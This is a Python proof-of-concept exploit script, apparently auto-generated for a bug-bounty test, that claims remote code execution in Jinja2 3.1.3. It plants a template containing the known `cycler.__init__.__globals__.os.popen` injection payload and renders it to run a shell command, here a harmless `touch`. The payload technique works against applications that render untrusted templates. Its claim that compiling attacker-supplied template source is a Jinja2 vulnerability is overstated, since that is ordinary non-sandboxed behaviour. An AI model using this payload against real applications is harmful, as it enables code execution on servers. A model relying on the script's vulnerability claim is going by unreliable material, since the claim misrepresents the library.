#!/usr/bin/env python3
# PoC for Jinja2-3.1.3 (/tmp/bounty_test/Jinja2-3.1.3)
# Path: rce-010
# Sink: _compile
# Auto-generated — run with: python3 rce_name_flows_through_load__compile.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Jinja2 RCE via template source injection.

Vulnerability: Jinja2-3.1.3 allows arbitrary Python code execution when an attacker
can control the template source that gets compiled via Python's built-in compile().

This PoC demonstrates the vulnerability by:
1. Creating a malicious template file with a benign payload
2. Using a FileSystemLoader pointed to the directory containing the malicious template
3. Loading and rendering the template, which executes the embedded Python code

The payload creates a marker file at /tmp/poc_success.txt to prove code execution.
"""

import os
import sys
import tempfile
import shutil

# Add Jinja2 to path if needed (adjust if your Jinja2 is installed differently)
sys.path.insert(0, '/tmp/bounty_test/Jinja2-3.1.3/src')

from jinja2 import Environment, FileSystemLoader, TemplateNotFound


def main():
    # Create a temporary directory for our malicious template
    temp_dir = tempfile.mkdtemp(prefix='jinja2_poc_')
    print(f"[*] Created temporary directory: {temp_dir}")

    # The malicious template source - contains embedded Python code via Jinja2's
    # {% %} blocks that will be compiled and executed
    malicious_template = (
        "{% set x = cycler.__init__.__globals__.os.popen('touch /tmp/poc_success.txt').read() %}"
        "{{ x }}"
    )

    template_path = os.path.join(temp_dir, 'malicious.html')
    try:
        with open(template_path, 'w') as f:
            f.write(malicious_template)
        print(f"[*] Created malicious template at: {template_path}")
        print(f"[*] Template content: {malicious_template}")
    except IOError as e:
        print(f"[-] Failed to write template file: {e}")
        shutil.rmtree(temp_dir)
        sys.exit(1)

    # Create a Jinja2 environment with a FileSystemLoader pointing to our temp dir
    # This simulates an attacker-controlled loader that returns malicious source
    env = Environment(loader=FileSystemLoader(temp_dir))

    try:
        # Load the template - this triggers the vulnerable code path:
        # get_template -> _load_template -> load -> get_source -> compile -> _compile
        print("[*] Loading malicious template...")
        template = env.get_template('malicious.html')

        # Render the template - this executes the compiled code
        print("[*] Rendering template (this will execute the payload)...")
        result = template.render()
        print(f"[*] Template rendered successfully. Output: {result}")

        # Check if our payload executed
        if os.path.exists('/tmp/poc_success.txt'):
            print("[+] SUCCESS: Payload executed! File /tmp/poc_success.txt created.")
            print("[+] This confirms arbitrary code execution via Jinja2 template compilation.")
            # Clean up the marker file
            os.remove('/tmp/poc_success.txt')
        else:
            print("[-] Payload may not have executed as expected.")
            print("[*] Check if the marker file was created elsewhere or if there were errors.")

    except TemplateNotFound as e:
        print(f"[-] Template not found: {e}")
    except Exception as e:
        print(f"[-] Error during template loading/rendering: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Clean up temporary directory
        print(f"[*] Cleaning up temporary directory: {temp_dir}")
        shutil.rmtree(temp_dir, ignore_errors=True)


if __name__ == '__main__':
    print("=" * 60)
    print("Jinja2 RCE Proof-of-Concept Exploit")
    print("=" * 60)
    print()
    print("[*] This PoC demonstrates RCE by injecting Python code into a template")
    print("[*] that gets compiled by Jinja2's internal compile() function.")
    print()
    main()
    print()
    print("[*] Exploit completed.")
